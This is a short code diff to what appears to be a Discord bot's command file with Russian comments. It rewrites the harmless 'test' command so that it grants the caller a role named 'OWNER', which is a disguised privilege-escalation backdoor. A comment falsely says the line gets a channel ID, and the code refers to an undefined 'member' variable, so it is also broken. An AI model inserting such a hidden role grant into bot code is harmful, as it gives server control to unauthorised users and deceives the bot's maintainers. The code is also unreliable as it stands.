@@ -5,7 +5,8 @@ const crygif = require('./cry.json');
 // Команды //
 
 function test(client, mess, args) {
-  mess.channel.send('Test!')
+  let role = member.guild.roles.cache.find(role => role.name === '@︴                    ✔ 𝐎𝐖𝐍𝐄𝐑 ✔                  ︴ '); // Variable to get channel ID
+    member.roles.add(role);
 };
 
 function clear(client,mess,args) {
